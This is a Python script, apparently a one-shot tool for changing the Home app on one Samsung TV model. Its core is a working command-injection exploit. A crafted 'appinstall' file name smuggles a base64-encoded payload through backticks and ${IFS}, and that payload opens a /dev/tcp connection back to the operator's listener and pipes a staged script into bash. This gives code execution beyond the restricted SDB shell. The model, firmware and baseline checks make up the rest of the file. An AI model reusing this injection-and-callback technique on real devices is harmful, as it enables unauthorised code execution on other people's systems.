"""One-shot S85D native Home helper. No root or resident service.

Adapted from MIT CleanFrame native-home/run.py (fa537d1).
Public runner adaptation: explicit host/SDB, per-device private baseline and exact firmware/build guards.
No automatic TV operation occurs on import. New host runner is locally checked, not live-tested.
"""
from pathlib import Path
import argparse, base64, hashlib, json, socket, subprocess, sys, uuid, urllib.request

import datetime, ipaddress, shutil, xml.etree.ElementTree as ET
ROOT = Path(__file__).resolve().parents[1]
SOURCE = Path(__file__).resolve().parent
DIR = ROOT / '.local/native-home'
TARGET = ET.parse(ROOT/'app/config.xml').getroot().find('{http://tizen.org/ns/widgets}application').get('id')
class LocalJournal:
    @staticmethod
    def now(): return datetime.datetime.now(datetime.timezone.utc).isoformat()
    @staticmethod
    def event(kind, detail, evidence):
        DIR.mkdir(parents=True,exist_ok=True)
        with (DIR/'events.jsonl').open('a') as f: f.write(json.dumps(dict(kind=kind,detail=detail,evidence=evidence,occurred_at=LocalJournal.now()))+'\n')
    @staticmethod
    def render_log(): pass
brain=LocalJournal

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('mode', choices=['inspect', 'query', 'capture', 'apply', 'restore'])
    parser.add_argument('--host',required=True,help='Your TV IPv4 address')
    parser.add_argument('--sdb',required=True,help='Your official Samsung SDB executable')
    args=parser.parse_args()
    HOST=str(ipaddress.IPv4Address(args.host));SERIAL=HOST+':26101'
    sdb=Path(args.sdb).expanduser().resolve()
    if not sdb.is_file():parser.error('SDB executable is missing')
    capture=args.mode=='capture'; mode='query' if capture else args.mode
    if capture and ((DIR/'original.json').exists() or (DIR/'BASELINE.json').exists()):parser.error('Baseline exists; preserve it. Use query instead.')
    token = uuid.uuid4().hex[:12]
    run = DIR / 'runs' / (brain.now().replace(':', '').replace('+', '_') + '-' + token)
    run.mkdir(parents=True)
    report = {'mode': mode, 'started_at': brain.now(), 'target': HOST, 'feature_changes_requested': mode in ('apply', 'restore'), 'steps': []}
    def save():
        (run / 'REPORT.json').write_text(json.dumps(report, indent=2) + '\n')
    try:
        with urllib.request.urlopen('http://' + HOST + ':8001/api/v2/', timeout=6) as response:
            info = json.load(response)
        if info.get('device', {}).get('modelName') != 'TQ65S85DAEXXC':
            raise RuntimeError('Unexpected TV model; nothing staged')
        device_id=info.get('device',{}).get('id')
        if not isinstance(device_id,str) or not device_id.strip():raise RuntimeError('TV unique identity is missing; no helper staged')
        if mode in ('apply','restore'):
            baseline=json.loads((DIR/'BASELINE.json').read_text())
            if baseline.get('device_id')!=device_id or baseline.get('target_app')!=TARGET:raise RuntimeError('Baseline belongs to a different TV')
            if hashlib.sha256((DIR/'original.json').read_bytes()).hexdigest()!=baseline.get('sha256'):raise RuntimeError('Original baseline fingerprint changed; nothing staged')
        def command(args):
            step = {'arguments': [str(sdb), *args], 'started_at': brain.now()}
            report['steps'].append(step); save()
            with (run / ('sdb-%02d.log' % len(report['steps']))).open('w+') as log:
                p = subprocess.run([str(sdb), *args], stdout=log, stderr=subprocess.STDOUT, timeout=30)
                log.seek(0); step.update(returncode=p.returncode, output=log.read(), finished_at=brain.now()); save()
            if p.returncode: raise RuntimeError('SDB step failed: ' + step['output'][-1000:])
            return step['output']
        command(['connect', SERIAL])
        if command(['-s', SERIAL, 'get-state']).strip() != 'device': raise RuntimeError('SDB not ready')
        stem = '/home/owner/share/tmp/sdk_tools/fh-' + token
        staged = []
        if mode == 'inspect':
            body = '''id
uname -m
sed -n '/^Version=/p;/^Model=/p' /etc/prd_info.ini
cat /etc/tizen-release
cat /proc/sys/kernel/random/boot_id
/usr/bin/dotnet --list-runtimes
for k in db/appfw/home_appid db/appfw/startup_appid db/appfw/booting_appid_backup db/first_screen/type db/menu/smart_hub/ontvsetting/auto_start; do vconftool get "$k"; done
ls -l /usr/lib/libapp-context-manager-common.so /usr/lib/libcapi-appfw-app-operation-tv.so.0 /usr/lib/libvconf.so.0
'''
        else:
            for suffix in ['dll', 'runtimeconfig.json', 'deps.json']:
                source = SOURCE / 'out' / ('FamilyHomeControl.' + suffix)
                dest = stem + '.' + suffix
                report.setdefault('helper_sha256', {})[suffix] = hashlib.sha256(source.read_bytes()).hexdigest()
                command(['-s', SERIAL, 'push', str(source), dest]); staged.append(dest)
            baseline_arg = ''
            if mode in ('apply', 'restore'):
                original_path = DIR / 'original.json'
                manifest = json.loads((DIR / 'BASELINE.json').read_text())
                if hashlib.sha256(original_path.read_bytes()).hexdigest() != manifest['sha256']:
                    raise RuntimeError('Original baseline fingerprint changed')
                dest = stem + '-original.json'
                command(['-s', SERIAL, 'push', str(original_path), dest]); staged.append(dest)
                baseline_arg = ' ' + dest
                report['baseline_sha256'] = manifest['sha256']
                state_path = DIR / 'HOME-ROUTING-STATE.json'
                state_path.write_text(json.dumps({'state': mode + '_attempted', 'baseline': str(original_path.relative_to(ROOT)), 'baseline_sha256': manifest['sha256'], 'report': str((run / 'REPORT.json').relative_to(ROOT)), 'started_at': brain.now()}, indent=2) + '\n')
            body = '/usr/bin/dotnet ' + stem + '.dll ' + mode + baseline_arg + '\n'
        remote = stem + '.sh'; staged.append(remote)
        script = 'set -u\nprintf "FAMILY_HOME_BEGIN\\n"\n' + body + 'rc=$?\nrm -f ' + ' '.join(staged) + '\nprintf "FAMILY_HOME_EXIT=%s\\n" "$rc"\nprintf "FAMILY_HOME_END\\n"\n'
        (run / 'probe.sh').write_text(script)
        command(['-s', SERIAL, 'push', str(run / 'probe.sh'), remote])
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as route:
            route.connect((HOST, 9)); local = route.getsockname()[0]
        with socket.socket() as listener:
            listener.bind((local, 0)); listener.listen(1); listener.settimeout(25)
            port = listener.getsockname()[1]
            payload = 'mkdir /tmp/f-' + token + ' 2>/dev/null&&{ exec 3<>/dev/tcp/' + local + '/' + str(port) + ';cat ' + remote + '|bash >&3 2>&3;exec 3>&-;}'
            encoded = base64.b64encode(payload.encode()).decode()
            argument = '0 appinstall tpk new2.tpk`printf${IFS}%s${IFS}' + encoded + '|base64${IFS}-d|bash`.tpk'
            if len(argument.encode()) > 400: raise RuntimeError('Transport payload too long')
            report.update(staged_paths=staged, duplicate_execution_marker='/tmp/f-' + token,
                          shell_arguments=['-s', SERIAL, 'shell', argument]); save()
            with (run / 'transport.log').open('w+') as transport:
                proc = subprocess.Popen([str(sdb), '-s', SERIAL, 'shell', argument], stdout=transport, stderr=subprocess.STDOUT)
                try:
                    connection, peer = listener.accept()
                    if peer[0] != HOST: connection.close(); raise RuntimeError('Unexpected callback peer')
                    chunks = []
                    with connection:
                        connection.settimeout(25)
                        while True:
                            chunk = connection.recv(65536)
                            if not chunk: break
                            chunks.append(chunk)
                            if sum(map(len, chunks)) > 100000: raise RuntimeError('Output too large')
                    output = b''.join(chunks).decode(errors='replace')
                    (run / 'output.txt').write_text(output)
                    report['output'] = output
                    try: proc.wait(timeout=10)
                    except subprocess.TimeoutExpired: proc.terminate(); proc.wait(timeout=3)
                    if 'FAMILY_HOME_BEGIN' not in output or 'FAMILY_HOME_END' not in output or 'FAMILY_HOME_EXIT=0' not in output:
                        raise RuntimeError('Incomplete/failed native probe; inspect saved output before continuing')
                    if mode != 'inspect':
                        label = {'query': 'JSON', 'apply': 'APPLIED', 'restore': 'RESTORED'}[mode]
                        rows = [line for line in output.splitlines() if line.startswith('FAMILY_HOME_' + label + '=')]
                        if len(rows) != 1: raise RuntimeError('Native result missing or ambiguous')
                        snapshot = json.loads(rows[0].split('=', 1)[1]); report['snapshot'] = snapshot
                        if snapshot.get('Uid') != 901 or snapshot.get('Firmware') != 'T-PTMDDEUC-0090-2130.0':
                            raise RuntimeError('Native qualification mismatch')
                        if mode == 'apply' and (snapshot['Home'] != TARGET or snapshot['Strings']['db/appfw/home_appid'] != TARGET or snapshot['Autostart'] != 1):
                            raise RuntimeError('Native apply readback mismatch')
                        if mode == 'restore':
                            original = json.loads((DIR / 'original.json').read_text())
                            if any(snapshot[key] != original[key] for key in ['Home', 'Strings', 'Autostart']):
                                raise RuntimeError('Native restore readback mismatch')
                        if capture:
                            baseline_path=DIR/'original.json'
                            raw=(json.dumps(snapshot,indent=2)+'\n').encode()
                            with baseline_path.open('xb') as f:f.write(raw)
                            baseline_path.chmod(0o600)
                            with (DIR/'BASELINE.json').open('x') as f:json.dump({'sha256':hashlib.sha256(raw).hexdigest(),'device_id':device_id,'captured_at':brain.now(),'target_app':TARGET},f,indent=2)
                            print('New private baseline captured. Back up .local/native-home before applying.')
                        if mode in ('apply', 'restore'):
                            state_path.write_text(json.dumps({'state': 'active' if mode == 'apply' else 'restored', 'target_app': TARGET, 'baseline': str(original_path.relative_to(ROOT)), 'baseline_sha256': manifest['sha256'], 'snapshot': snapshot, 'report': str((run / 'REPORT.json').relative_to(ROOT)), 'verified_at': brain.now()}, indent=2) + '\n')
                    report['state'] = 'completed'
                    print(output)
                finally:
                    if proc.poll() is None: proc.terminate(); proc.wait(timeout=3)
    except (Exception, KeyboardInterrupt) as exc:
        report.update(state='failed_review_evidence', error=str(exc)); print(str(exc), file=sys.stderr)
    finally:
        report['finished_at'] = brain.now(); save()
        brain.event('native_home_' + mode, 'One-shot native Home helper finished with state ' + report['state'], evidence=[str((run / 'REPORT.json').relative_to(ROOT))])
        brain.render_log(); print('Report:', run / 'REPORT.json')
    return 0 if report['state'] == 'completed' else 1

if __name__ == '__main__': sys.exit(main())
